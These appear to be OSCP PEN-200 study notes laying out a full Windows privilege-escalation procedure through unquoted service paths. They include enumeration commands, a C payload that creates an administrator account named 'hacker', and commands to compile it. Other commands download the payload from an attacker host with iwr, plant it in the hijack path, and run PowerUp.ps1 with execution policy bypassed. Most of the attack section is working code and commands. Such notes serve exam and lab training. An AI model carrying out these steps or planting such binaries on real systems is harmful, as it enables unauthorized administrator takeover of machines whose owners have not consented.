# 🪟 OSCP PEN-200 — Unquoted Service Path Hijacking

> **Goal:** Exploit unquoted service paths with spaces → plant malicious binary
> → start service → escalate to Administrator

---

## 📖 Concept

When a service binary path contains **spaces** and is **not enclosed in quotes**,
Windows `CreateProcess` doesn't know where the filename ends and arguments begin.
It resolves this by splitting at every space and trying each combination as an executable.

```
C:\Program Files\My App\My Service\service.exe (unquoted)

Windows tries in order:
  1. C:\Program.exe
  2. C:\Program Files\My.exe
  3. C:\Program Files\My App\My.exe          ← most likely writable
  4. C:\Program Files\My App\My Service\service.exe
```

> Plant your binary at whichever path you can **write to** and name it to match.

---

## ✅ Requirements

| Requirement | Why |
|---|---|
| Service path has spaces + no quotes | Triggers the split behaviour |
| Write access to one of the resolved dirs | To plant your binary |
| Ability to restart service OR reboot | To trigger execution |

---

## 🗺️ Attack Flow

### Step 1 — Find Unquoted Service Paths

**CMD (recommended — avoids PowerShell escaping issues):**
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**PowerShell alternative:**
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'}
```

**What to look for:** Paths outside `C:\Windows\` that contain spaces and no quotes.

---

### Step 2 — Map Out All Resolved Paths

Given path: `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe   ← check this one
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

> Skip the last path — that's the real binary, not a hijack point.

---

### Step 3 — Check Write Access on Each Resolved Directory

```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

**Look for `(W)` or `(M)` or `(F)` for your user/group:**

| Permission | Exploitable? |
|---|---|
| `BUILTIN\Users:(W)` | ✅ Yes |
| `Authenticated Users:(M)` | ✅ Yes |
| `BUILTIN\Users:(RX)` | ❌ No |

> Typically `C:\` and `C:\Program Files` won't be writable.
> The app's **own subdirectory** is the most likely writable path.

---

### Step 4 — Check if You Can Restart the Service

```powershell
Start-Service <ServiceName>
Stop-Service <ServiceName>
```

If no error → you can restart without rebooting ✅  
If access denied → check `SeShutdownPrivilege` and reboot instead.

---

### Step 5 — Create Malicious Binary (Kali)

Reuse the same `adduser.c` from Service Binary Hijacking:

```c
#include <stdlib.h>

int main()
{
    int i;
    i = system("net user hacker password123! /add");
    i = system("net localgroup administrators hacker /add");
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o Current.exe
python3 -m http.server 80
```

> Name the output to match the **resolved filename** at your writable path.

---

### Step 6 — Transfer & Plant Binary (Target)

```powershell
# Download with the correct name
iwr -uri http://<KALI_IP>/adduser.exe -Outfile Current.exe

# Copy to the writable resolved path
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

---

### Step 7 — Trigger & Verify

```powershell
Start-Service <ServiceName>

# Service may throw an error — ignore it, binary still executes
net user
net localgroup administrators
```

> The error on `Start-Service` is expected — Windows can't run the original
> service properly because our binary doesn't accept service parameters.
> The payload still executes before the error. ✅

---

### Step 8 — Restore

```powershell
Stop-Service <ServiceName>
del 'C:\Program Files\Enterprise Apps\Current.exe'
net user hacker /delete
Start-Service <ServiceName>
```

---

## 🤖 Automated — PowerUp.ps1

```powershell
iwr http://<KALI_IP>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1

# Identify
Get-UnquotedService

# Exploit
Write-ServiceBinary -Name '<ServiceName>' -Path '<WritablePath>\<Name>.exe'
Restart-Service <ServiceName>
```

> Default behavior creates user `john` with password `Password123!`
> and adds to local Administrators.

---

## ⚖️ Comparison — All Three Service Attacks

| | Binary Hijacking | DLL Hijacking | Unquoted Path |
|---|---|---|---|
| Target | Service `.exe` | `.dll` the exe loads | Writable dir in unquoted path |
| Write access needed | On the binary itself | App directory | Subdirectory in resolved path |
| Path requires spaces? | ❌ No | ❌ No | ✅ Yes |
| Quotes required? | N/A | N/A | Must be **missing** |
| Runs as | Service account | App launcher | Service account |
| PowerUp function | `Get-ModifiableServiceFile` | N/A | `Get-UnquotedService` |

---

## ⚡ Quick Reference

```cmd
# Find unquoted paths (CMD)
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
# Check write access
icacls "C:\path\to\dir"

# Check restart permission
Start-Service <ServiceName>
Stop-Service <ServiceName>

# Plant binary
copy .\evil.exe 'C:\writable\path\Resolved.exe'

# Trigger
Start-Service <ServiceName>

# Verify
net localgroup administrators

# PowerUp
Get-UnquotedService
Write-ServiceBinary -Name '<ServiceName>' -Path '<HijackPath>'
```

```bash
# Kali — compile
x86_64-w64-mingw32-gcc adduser.c -o Resolved.exe

# Kali — serve
python3 -m http.server 80
```

---
